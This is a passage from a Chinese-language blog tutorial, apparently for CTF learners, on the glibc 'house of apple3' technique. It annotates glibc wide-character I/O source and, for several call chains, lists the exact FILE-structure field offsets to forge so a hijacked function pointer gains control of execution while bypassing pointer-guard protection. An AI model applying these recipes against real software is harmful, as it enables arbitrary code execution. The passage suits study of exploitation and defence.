class="line">  <span class="class"><span class="keyword">enum</span> __<span class="title">codecvt_result</span> <span class="title">result</span>;</span></span><br><span class="line">  <span class="comment">// gs 源自第一个参数</span></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> __<span class="title">gconv_step</span> *<span class="title">gs</span> =</span> codecvt-&gt;__cd_in.step;</span><br><span class="line">  <span class="type">int</span> status;</span><br><span class="line">  <span class="type">size_t</span> dummy;</span><br><span class="line">  <span class="type">const</span> <span class="type">unsigned</span> <span class="type">char</span> *from_start_copy = (<span class="type">unsigned</span> <span class="type">char</span> *) from_start;</span><br><span class="line"> </span><br><span class="line">  codecvt-&gt;__cd_in.step_data.__outbuf = (<span class="type">unsigned</span> <span class="type">char</span> *) to_start;</span><br><span class="line">  codecvt-&gt;__cd_in.step_data.__outbufend = (<span class="type">unsigned</span> <span class="type">char</span> *) to_end;</span><br><span class="line">  codecvt-&gt;__cd_in.step_data.__statep = statep;</span><br><span class="line"> </span><br><span class="line">  __gconv_fct fct = gs-&gt;__fct;</span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> PTR_DEMANGLE</span></span><br><span class="line">  <span class="comment">// 如果gs-&gt;__shlib_handle不为空，则会用__pointer_guard去解密</span></span><br><span class="line">  <span class="comment">// 这里如果可控，设置为NULL即可绕过解密</span></span><br><span class="line">  <span class="keyword">if</span> (gs-&gt;__shlib_handle != <span class="literal">NULL</span>)</span><br><span class="line">    PTR_DEMANGLE (fct);</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line">  <span class="comment">// 这里有函数指针调用</span></span><br><span class="line">  <span class="comment">// 这个宏就是调用fct(gs, ...)</span></span><br><span class="line">  status = DL_CALL_FCT (fct,</span><br><span class="line">            (gs, &amp;codecvt-&gt;__cd_in.step_data, &amp;from_start_copy,</span><br><span class="line">             (<span class="type">const</span> <span class="type">unsigned</span> <span class="type">char</span> *) from_end, <span class="literal">NULL</span>,</span><br><span class="line">             &amp;dummy, <span class="number">0</span>, <span class="number">0</span>));</span><br><span class="line">       <span class="comment">// ......</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>其中，<code>__gconv_fct</code>和<code>DL_CALL_FCT</code>被定义为：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* Type of a conversion function.  */</span></span><br><span class="line"><span class="keyword">typedef</span> <span class="title function_">int</span> <span class="params">(*__gconv_fct)</span> <span class="params">(<span class="keyword">struct</span> __gconv_step *, <span class="keyword">struct</span> __gconv_step_data *,</span></span><br><span class="line"><span class="params">                <span class="type">const</span> <span class="type">unsigned</span> <span class="type">char</span> **, <span class="type">const</span> <span class="type">unsigned</span> <span class="type">char</span> *,</span></span><br><span class="line"><span class="params">                <span class="type">unsigned</span> <span class="type">char</span> **, <span class="type">size_t</span> *, <span class="type">int</span>, <span class="type">int</span>)</span>;</span><br><span class="line"> </span><br><span class="line"><span class="meta">#<span class="keyword">ifndef</span> DL_CALL_FCT</span></span><br><span class="line"><span class="meta"># <span class="keyword">define</span> DL_CALL_FCT(fct, args) fct args</span></span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br></pre></td></tr></table></figure>
<p>而在<code>_IO_wfile_underflow</code>函数中调用了<code>__libio_codecvt_in</code>，代码片段如下：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">wint_t</span></span><br><span class="line">_IO_wfile_underflow (FILE *fp)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="class"><span class="keyword">struct</span> _<span class="title">IO_codecvt</span> *<span class="title">cd</span>;</span></span><br><span class="line">  <span class="class"><span class="keyword">enum</span> __<span class="title">codecvt_result</span> <span class="title">status</span>;</span></span><br><span class="line">  <span class="type">ssize_t</span> count;</span><br><span class="line"> </span><br><span class="line">  <span class="comment">/* C99 requires EOF to be &quot;sticky&quot;.  */</span></span><br><span class="line"> </span><br><span class="line">  <span class="comment">// 不能进入这个分支</span></span><br><span class="line">  <span class="keyword">if</span> (fp-&gt;_flags &amp; _IO_EOF_SEEN)</span><br><span class="line">    <span class="keyword">return</span> WEOF;</span><br><span class="line">  <span class="comment">// 不能进入这个分支</span></span><br><span class="line">  <span class="keyword">if</span> (__glibc_unlikely (fp-&gt;_flags &amp; _IO_NO_READS))</span><br><span class="line">    &#123;</span><br><span class="line">      fp-&gt;_flags |= _IO_ERR_SEEN;</span><br><span class="line">      __set_errno (EBADF);</span><br><span class="line">      <span class="keyword">return</span> WEOF;</span><br><span class="line">    &#125;</span><br><span class="line">  <span class="comment">// 不能进入这个分支</span></span><br><span class="line">  <span class="keyword">if</span> (fp-&gt;_wide_data-&gt;_IO_read_ptr &lt; fp-&gt;_wide_data-&gt;_IO_read_end)</span><br><span class="line">    <span class="keyword">return</span> *fp-&gt;_wide_data-&gt;_IO_read_ptr;</span><br><span class="line"> </span><br><span class="line">  cd = fp-&gt;_codecvt;</span><br><span class="line"> </span><br><span class="line">  <span class="comment">// 需要进入这个分支</span></span><br><span class="line">  <span class="comment">/* Maybe there is something left in the external buffer.  */</span></span><br><span class="line">  <span class="keyword">if</span> (fp-&gt;_IO_read_ptr &lt; fp-&gt;_IO_read_end)</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="comment">/* There is more in the external.  Convert it.  */</span></span><br><span class="line">      <span class="type">const</span> <span class="type">char</span> *read_stop = (<span class="type">const</span> <span class="type">char</span> *) fp-&gt;_IO_read_ptr;</span><br><span class="line"> </span><br><span class="line">      fp-&gt;_wide_data-&gt;_IO_last_state = fp-&gt;_wide_data-&gt;_IO_state;</span><br><span class="line">      fp-&gt;_wide_data-&gt;_IO_read_base = fp-&gt;_wide_data-&gt;_IO_read_ptr =</span><br><span class="line">    fp-&gt;_wide_data-&gt;_IO_buf_base;</span><br><span class="line">    <span class="comment">// 需要一路调用到这里</span></span><br><span class="line">      status = __libio_codecvt_in (cd, &amp;fp-&gt;_wide_data-&gt;_IO_state,</span><br><span class="line">                   fp-&gt;_IO_read_ptr, fp-&gt;_IO_read_end,</span><br><span class="line">                   &amp;read_stop,</span><br><span class="line">                   fp-&gt;_wide_data-&gt;_IO_read_ptr,</span><br><span class="line">                   fp-&gt;_wide_data-&gt;_IO_buf_end,</span><br><span class="line">                   &amp;fp-&gt;_wide_data-&gt;_IO_read_end);</span><br><span class="line">           <span class="comment">// ......</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>而<code>_IO_wfile_underflow</code>又是<code>_IO_wfile_jumps</code>这个<code>_IO_jump_t</code>类型变量的成员函数。</p>
<p>分析到这里，利用原理就呼之欲出了：劫持或者伪造<code>FILE</code>结构体的<code>fp-&gt;vtable</code>为<code>_IO_wfile_jumps</code>，<code>fp-&gt;_codecvt</code>为可控堆地址，当程序执行<code>IO</code>操作时，控制程序执行流走到<code>_IO_wfile_underflow</code>，设置好<code>fp-&gt;codecvt-&gt;__cd_in</code>结构体，使得最终调用到<code>__libio_codecvt_in</code>中的<code>DL_CALL_FCT</code>宏，伪造函数指针，进而控制程序执行流。</p>
<p>注意，在伪造过程中，可以设置<code>gs-&gt;__shlib_handle == NULL</code>，从而绕过<code>__pointer_guard</code>的指针调用保护。</p>
<hr>
<p><strong>注意：</strong><br>因为<code>_wide_data</code>设置不当的话会影响某些利用链的分支走向。但是，如果采用默认的<code>_wide_data</code>成员（默认会指向<code>_IO_wide_data_2</code>，除了<code>_wide_vtable</code>外其他成员均默认为<code>0</code>），也并不影响<code>house of apple3</code>的利用。</p>
<p>因此，如果能伪造整个<code>FILE</code>结构体，则需要设置合适的<code>_wide_data</code>；如果只能伪部分<code>FILE</code>的成员的话，保持<code>fp-&gt;_wide_data</code>为默认地址即可</p>
<h2 id="利用-2"><a href="#利用-2" class="headerlink" title="利用"></a>利用</h2><p>目前在<code>glibc</code>源码中搜索到的<code>__libio_codecvt_in/__libio_codecvt_out/__libio_codecvt_length</code>的调用链比较多</p>
<h3 id="利用-IO-wfile-underflow函数控制程序执行流"><a href="#利用-IO-wfile-underflow函数控制程序执行流" class="headerlink" title="利用_IO_wfile_underflow函数控制程序执行流"></a>利用_IO_wfile_underflow函数控制程序执行流</h3><p>对<code>fp</code>的设置如下：</p>
<ul>
<li><code>_flags</code>设置为<code>~(4 | 0x10)</code></li>
<li><code>vtable</code>设置为<code>_IO_wfile_jumps</code>地址（加减偏移），使其能成功调用<code>_IO_wfile_underflow</code>即可</li>
<li><code>fp-&gt;_IO_read_ptr &lt; fp-&gt;_IO_read_end</code>，即满足<code>*(fp + 8) &lt; *(fp + 0x10)</code></li>
<li><code>_wide_data</code>保持默认，或者设置为堆地址，假设其地址为<code>A</code>，即满足<code>*(fp + 0xa0) = A</code></li>
<li><code>_wide_data-&gt;_IO_read_ptr &gt;= _wide_data-&gt;_IO_read_end</code>，即满足<code>*A &gt;= *(A + 8)</code></li>
<li><code>_codecvt</code>设置为可控堆地址<code>B</code>，即满足<code>*(fp + 0x98) = B</code></li>
<li><code>codecvt-&gt;__cd_in.step</code>设置为可控堆地址<code>C</code>，即满足<code>*B = C</code></li>
<li><code>codecvt-&gt;__cd_in.step-&gt;__shlib_handle</code>设置为<code>0</code>，即满足<code>*C = 0</code></li>
<li><code>codecvt-&gt;__cd_in.step-&gt;__fct</code>设置为地址<code>D</code>,地址<code>D</code>用于控制<code>rip</code>，即满足<code>*(C + 0x28) = D</code>。当调用到<code>D</code>的时候，此时的<code>rdi</code>为<code>C</code>。如果<code>_wide_data</code>也可控的话，<code>rsi</code>也能控制。</li>
</ul>
<p>函数的调用链如下：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">_IO_wfile_underflow</span><br><span class="line">    __libio_codecvt_in</span><br><span class="line">        DL_CALL_FCT</span><br><span class="line">            gs = fp-&gt;_codecvt-&gt;__cd_in.step</span><br><span class="line">            *(gs-&gt;__fct)(gs)</span><br></pre></td></tr></table></figure>
<h3 id="利用-IO-wfile-underflow-mmap函数控制程序执行流-1"><a href="#利用-IO-wfile-underflow-mmap函数控制程序执行流-1" class="headerlink" title="利用_IO_wfile_underflow_mmap函数控制程序执行流"></a>利用_IO_wfile_underflow_mmap函数控制程序执行流</h3><p>对<code>fp</code>的设置如下：</p>
<ul>
<li><code>_flags</code>设置为<code>~4</code></li>
<li><code>vtable</code>设置为<code>_IO_wfile_jumps_mmap</code>地址（加减偏移），使其能成功调用<code>_IO_wfile_underflow_mmap</code>即可</li>
<li><code>_IO_read_ptr &lt; _IO_read_end</code>，即满足<code>*(fp + 8) &lt; *(fp + 0x10)</code></li>
<li><code>_wide_data</code>保持默认，或者设置为堆地址，假设其地址为<code>A</code>，即满足<code>*(fp + 0xa0) = A</code></li>
<li><code>_wide_data-&gt;_IO_read_ptr &gt;= _wide_data-&gt;_IO_read_end</code>，即满足<code>*A &gt;= *(A + 8)</code></li>
<li><code>_wide_data-&gt;_IO_buf_base</code>设置为非<code>0</code>，即满足<code>*(A + 0x30) != 0</code></li>
<li><code>_codecvt</code>设置为可控堆地址<code>B</code>，即满足<code>*(fp + 0x98) = B</code></li>
<li><code>codecvt-&gt;__cd_in.step</code>设置为可控堆地址<code>C</code>，即满足<code>*B = C</code></li>
<li><code>codecvt-&gt;__cd_in.step-&gt;__shlib_handle</code>设置为<code>0</code>，即满足<code>*C = 0</code></li>
<li><code>codecvt-&gt;__cd_in.step-&gt;__fct</code>设置为地址<code>D</code>,地址<code>D</code>用于控制<code>rip</code>，即满足<code>*(C + 0x28) = D</code>。当调用到<code>D</code>的时候，此时的<code>rdi</code>为<code>C</code>。如果<code>_wide_data</code>也可控的话，<code>rsi</code>也能控制。</li>
</ul>
<p>函数的调用链如下：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">_IO_wfile_underflow_mmap</span><br><span class="line">    __libio_codecvt_in</span><br><span class="line">        DL_CALL_FCT</span><br><span class="line">            gs = fp-&gt;_codecvt-&gt;__cd_in.step</span><br><span class="line">            *(gs-&gt;__fct)(gs)</span><br></pre></td></tr></table></figure>
<p>详细分析如下：<br>看<code>_IO_wfile_underflow_mmap</code>函数：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">static</span> <span class="type">wint_t</span></span><br><span class="line">_IO_wfile_underflow_mmap (FILE *fp)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="class"><span class="keyword">struct</span> _<span class="title">IO_codecvt</span> *<span class="title">cd</span>;</span></span><br><span class="line">  <span class="type">const</span> <span class="type">char</span> *read_stop;</span><br><span class="line">  <span class="comment">// 不能进入这个分支</span></span><br><span class="line">  <span class="keyword">if</span> (__glibc_unlikely (fp-&gt;_flags &amp; _IO_NO_READS))</span><br><span class="line">    &#123;</span><br><span class="line">      fp-&gt;_flags |= _IO_ERR_SEEN;</span><br><span class="line">      __set_errno (EBADF);</span><br><span class="line">      <span class="keyword">return</span> WEOF;</span><br><span class="line">    &#125;</span><br><span class="line">  <span class="comment">// 不能进入这个分支</span></span><br><span class="line">  <span class="keyword">if</span> (fp-&gt;_wide_data-&gt;_IO_read_ptr &lt; fp-&gt;_wide_data-&gt;_IO_read_end)</span><br><span class="line">    <span class="keyword">return</span> *fp-&gt;_wide_data-&gt;_IO_read_ptr;</span><br><span class="line"> </span><br><span class="line">  cd = fp-&gt;_codecvt;</span><br><span class="line"> </span><br><span class="line">  <span class="comment">/* Maybe there is something left in the external buffer.  */</span></span><br><span class="line">  <span class="comment">// 最好不要进入这个分支</span></span><br><span class="line">  <span class="keyword">if</span> (fp-&gt;_IO_read_ptr &gt;= fp-&gt;_IO_read_end</span><br><span class="line">      <span class="comment">/* No.  But maybe the read buffer is not fully set up.  */</span></span><br><span class="line">      &amp;&amp; _IO_file_underflow_mmap (fp) == EOF)</span><br><span class="line">    <span class="comment">/* Nothing available.  _IO_file_underflow_mmap has set the EOF or error</span></span><br><span class="line"><span class="comment">       flags as appropriate.  */</span></span><br><span class="line">    <span class="keyword">return</span> WEOF;</span><br><span class="line"> </span><br><span class="line">  <span class="comment">/* There is more in the external.  Convert it.  */</span></span><br><span class="line">  read_stop = (<span class="type">const</span> <span class="type">char</span> *) fp-&gt;_IO_read_ptr;</span><br><span class="line"> </span><br><span class="line">  <span class="comment">// 最好不要进入这个分支</span></span><br><span class="line">  <span class="keyword">if</span> (fp-&gt;_wide_data-&gt;_IO_buf_base == <span class="literal">NULL</span>)</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="comment">/* Maybe we already have a push back pointer.  */</span></span><br><span class="line">      <span class="keyword">if</span> (fp-&gt;_wide_data-&gt;_IO_save_base != <span class="literal">NULL</span>)</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="built_in">free</span> (fp-&gt;_wide_data-&gt;_IO_save_base);</span><br><span class="line">      fp-&gt;_flags &amp;= ~_IO_IN_BACKUP;</span><br><span class="line">    &#125;</span><br><span class="line">      _IO_wdoallocbuf (fp);<span class="comment">// 需要走到这里</span></span><br><span class="line">    &#125;</span><br><span class="line">  fp-&gt;_wide_data-&gt;_IO_last_state = fp-&gt;_wide_data-&gt;_IO_state;</span><br><span class="line">  fp-&gt;_wide_data-&gt;_IO_read_base = fp-&gt;_wide_data-&gt;_IO_read_ptr =</span><br><span class="line">    fp-&gt;_wide_data-&gt;_IO_buf_base;</span><br><span class="line"> </span><br><span class="line">    <span class="comment">// 需要调用到这里</span></span><br><span class="line">  __libio_codecvt_in (cd, &amp;fp-&gt;_wide_data-&gt;_IO_state,</span><br><span class="line">              fp-&gt;_IO_read_ptr, fp-&gt;_IO_read_end,</span><br><span class="line">              &amp;read_stop,</span><br><span class="line">              fp-&gt;_wide_data-&gt;_IO_read_ptr,</span><br><span class="line">              fp-&gt;_wide_data-&gt;_IO_buf_end,</span><br><span class="line">              &amp;fp-&gt;_wide_data-&gt;_IO_read_end);</span><br><span class="line">    <span class="comment">//......</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>需要设置<code>fp-&gt;_flags &amp; _IO_NO_READS == 0</code>，设置<code>fp-&gt;_wide_data-&gt;_IO_read_ptr &gt;= fp-&gt;_wide_data-&gt;_IO_read_end</code>，设置<code>fp-&gt;_IO_read_ptr &lt; fp-&gt;_IO_read_end</code>不进入调用，设置<code>fp-&gt;_wide_data-&gt;_IO_buf_base != NULL</code>不进入调用</p>
<h3 id="利用-IO-wdo-write函数控制程序执行流"><a href="#利用-IO-wdo-write函数控制程序执行流" class="headerlink" title="利用_IO_wdo_write函数控制程序执行流"></a>利用_IO_wdo_write函数控制程序执行流</h3><p><code>IO_wdo_write</code>的调用点很多，这里选择一个相对简单的链：</p>
<p>对<code>fp</code>的设置如下：</p>
<ul>
<li><code>vtable</code>设置为<code>_IO_file_jumps/</code>地址（加减偏移），使其能成功调用<code>_IO_new_file_sync</code>即可</li>
<li><code>_IO_write_ptr &gt; _IO_write_base</code>，即满足<code>*(fp + 0x28) &gt; *(fp + 0x20)</code></li>
<li><code>_mode &gt; 0</code>，即满足<code>(fp + 0xc0) &gt; 0</code></li>
<li><code>_IO_write_end != _IO_write_ptr</code>或者<code>_IO_write_end == _IO_write_base</code>，即满足<code>*(fp + 0x30) != *(fp + 0x28)</code>或者<code>*(fp + 0x30) == *(fp + 0x20)</code></li>
<li><code>_wide_data</code>设置为堆地址，假设地址为<code>A</code>，即满足<code>*(fp + 0xa0) = A</code></li>
<li><code>_wide_data-&gt;_IO_write_ptr &gt;= _wide_data-&gt;_IO_write_base</code>，即满足<code>*(A + 0x20) &gt;= *(A + 0x18)</code></li>
<li><code>_codecvt</code>设置为可控堆地址<code>B</code>，即满足<code>*(fp + 0x98) = B</code></li>
<li><code>codecvt-&gt;__cd_out.step</code>设置为可控堆地址<code>C</code>，即满足<code>*(B + 0x38) = C</code></li>
<li><code>codecvt-&gt;__cd_out.step-&gt;__shlib_handle</code>设置为<code>0</code>，即满足<code>*C = 0</code></li>
<li><code>codecvt-&gt;__cd_out.step-&gt;__fct</code>设置为地址<code>D</code>,地址<code>D</code>用于控制<code>rip</code>，即满足<code>*(C + 0x28) = D</code>。当调用到<code>D</code>的时候，此时的<code>rdi</code>为<code>C</code>。如果<code>_wide_data</code>也可控的话，<code>rsi</code>也能控制。</li>
</ul>
<p>函数的调用链如下：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">_IO_new_file_sync</span><br><span class="line">    _IO_do_flush</span><br><span class="line">        _IO_wdo_write</span><br><span class="line">          __libio_codecvt_out</span><br><span class="line">              DL_CALL_FCT</span><br><span class="line">                  gs = fp-&gt;_codecvt-&gt;__cd_out.step</span><br><span class="line">                  *(gs-&gt;__fct)(gs)</span><br></pre></td></tr></table></figure>
<p>详细分析如下：<br>首先看<code>_IO_new_file_sync</code>函数：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span></span><br><span class="line">_IO_new_file_sync (FILE *fp)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">ssize_t</span> delta;</span><br><span class="line">  <span class="type">int</span> retval = <span class="number">0</span>;</span><br><span class="line"> </span><br><span class="line">  <span class="comment">/*    char* ptr = cur_ptr(); */</span></span><br><span class="line">  <span class="keyword">if</span> (fp-&gt;_IO_write_ptr &gt; fp-&gt;_IO_write_base)</span><br><span class="line">    <span class="keyword">if</span> (_IO_do_flush(fp)) <span class="keyword">return</span> EOF;<span class="comment">//调用到这里</span></span><br><span class="line">    <span class="comment">//......</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>只需要满足<code>fp-&gt;_IO_write_ptr &gt; fp-&gt;_IO_write_base</code>。</p>
<p>然后看<code>_IO_do_flush</code>宏：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">define</span> _IO_do_flush(_f) \</span></span><br><span class="line"><span class="meta">  ((_f)-&gt;_mode &lt;= 0                                  \</span></span><br><span class="line"><span class="meta">   ? _IO_do_write(_f, (_f)-&gt;_IO_write_base,                      \</span></span><br><span class="line"><span class="meta">          (_f)-&gt;_IO_write_ptr-(_f)-&gt;_IO_write_base)              \</span></span><br><span class="line"><span class="meta">   : _IO_wdo_write(_f, (_f)-&gt;_wide_data-&gt;_IO_write_base,              \</span></span><br><span class="line"><span class="meta">           ((_f)-&gt;_wide_data-&gt;_IO_write_ptr                  \</span></span><br><span class="line"><span class="meta">            - (_f)-&gt;_wide_data-&gt;_IO_write_base)))</span></span><br></pre></td></tr></table></figure>
<p>根据<code>fp-&gt;_mode</code>的值选择调用<code>_IO_do_write</code>或者<code>_IO_wdo_write</code>。这里我们要调用后者，必须使<code>fp-&gt;_mode &gt; 0</code>。此时的第二个参数为<code>fp-&gt;_wide_data-&gt;_IO_write_base</code>，第三个参数为<code>fp-&gt;_wide_data-&gt;_IO_write_ptr - fp-&gt;_wide_data-&gt;_IO_write_base</code>。</p>
<p>接着看<code>_IO_wdo_write</code>：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span></span><br><span class="line">_IO_wdo_write (FILE *fp, <span class="type">const</span> <span class="type">wchar_t</span> *data, <span class="type">size_t</span> to_do)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="class"><span class="keyword">struct</span> _<span class="title">IO_codecvt</span> *<span class="title">cc</span> =</span> fp-&gt;_codecvt;</span><br><span class="line"> </span><br><span class="line">  <span class="comment">// 第三个参数必须要大于0</span></span><br><span class="line">  <span class="keyword">if</span> (to_do &gt; <span class="number">0</span>)</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">if</span> (fp-&gt;_IO_write_end == fp-&gt;_IO_write_ptr</span><br><span class="line">      &amp;&amp; fp-&gt;_IO_write_end != fp-&gt;_IO_write_base)</span><br><span class="line">    &#123;<span class="comment">// 不能进入这个分支</span></span><br><span class="line">      <span class="keyword">if</span> (_IO_new_do_write (fp, fp-&gt;_IO_write_base,</span><br><span class="line">                fp-&gt;_IO_write_ptr - fp-&gt;_IO_write_base) == EOF)</span><br><span class="line">        <span class="keyword">return</span> WEOF;</span><br><span class="line">    &#125;</span><br><span class="line"> </span><br><span class="line">  <span class="comment">// ......</span></span><br><span class="line"> </span><br><span class="line">      <span class="comment">/* Now convert from the internal format into the external buffer.  */</span></span><br><span class="line">    <span class="comment">// 需要调用到这里</span></span><br><span class="line">      result = __libio_codecvt_out (cc, &amp;fp-&gt;_wide_data-&gt;_IO_state,</span><br><span class="line">                    data, data + to_do, &amp;new_data,</span><br><span class="line">                    write_ptr,</span><br><span class="line">                    buf_end,</span><br><span class="line">                    &amp;write_ptr);</span><br><span class="line">          <span class="comment">//......</span></span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>首先<code>to_do</code>必须要大于<code>0</code>，即满足<code>fp-&gt;_wide_data-&gt;_IO_write_ptr &gt; fp-&gt;_wide_data-&gt;_IO_write_base</code>，然后这个判断需要为假<code>fp-&gt;_IO_write_end == fp-&gt;_IO_write_ptr &amp;&amp; fp-&gt;_IO_write_end != fp-&gt;_IO_write_base</code>。</p>
<p>这个链基本需要控制<code>fp-&gt;_wide_data</code>，相比上两条链的约束条件要更多一点。</p>
<h3 id="使用-IO-wfile-sync函数控制程序执行流"><a href="#使用-IO-wfile-sync函数控制程序执行流" class="headerlink" title="使用_IO_wfile_sync函数控制程序执行流"></a>使用_IO_wfile_sync函数控制程序执行流</h3><p>对<code>fp</code>的设置如下：</p>
<ul>
<li><code>_flags</code>设置为<code>~(4 | 0x10)</code></li>
<li><code>vtable</code>设置为<code>_IO_wfile_jumps</code>地址（加减偏移），使其能成功调用<code>_IO_wfile_sync</code>即可</li>
<li><code>_wide_data</code>设置为堆地址，假设其地址为<code>A</code>，即满足<code>*(fp + 0xa0) = A</code></li>
<li><code>_wide_data-&gt;_IO_write_ptr &lt;= _wide_data-&gt;_IO_write_base</code>，即满足<code>*(A + 0x20) &lt;= *(A + 0x18)</code></li>
<li><code>_wide_data-&gt;_IO_read_ptr != _wide_data-&gt;_IO_read_end</code>，即满足<code>*A != *(A + 8)</code></li>
<li><code>_codecvt</code>设置为可控堆地址<code>B</code>，即满足<code>*(fp + 0x98) = B</code></li>
<li><code>codecvt-&gt;__cd_in.step</code>设置为可控堆地址<code>C</code>，即满足<code>*B = C</code></li>
<li><code>codecvt-&gt;__cd_in.step-&gt;__stateful</code>设置为非<code>0</code>，即满足<code>*(B + 0x58) != 0</code></li>
<li><code>codecvt-&gt;__cd_in.step-&gt;__shlib_handle</code>设置为<code>0</code>，即满足<code>*C = 0</code></li>
<li><code>codecvt-&gt;__cd_in.step-&gt;__fct</code>设置为地址<code>D</code>,地址<code>D</code>用于控制<code>rip</code>，即满足<code>*(C + 0x28) = D</code>。当调用到<code>D</code>的时候，此时的<code>rdi</code>为<code>C</code>。如果<code>rsi</code>为<code>&amp;codecvt-&gt;__cd_in.step_data</code>可控。</li>
</ul>
<p>函数的调用链如下：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">_IO_wfile_sync</span><br><span class="line">    __libio_codecvt_length</span><br><span class="line">        DL_CALL_FCT</span><br><span class="line">            gs = fp-&gt;_codecvt-&gt;__cd_in.step</span><br><span class="line">            *(gs-&gt;__fct)(gs)</span><br></pre></td></tr></table></figure>
<p>详细分析如下：<br>直接看<code>_IO_wfile_sync</code>函数：</p>
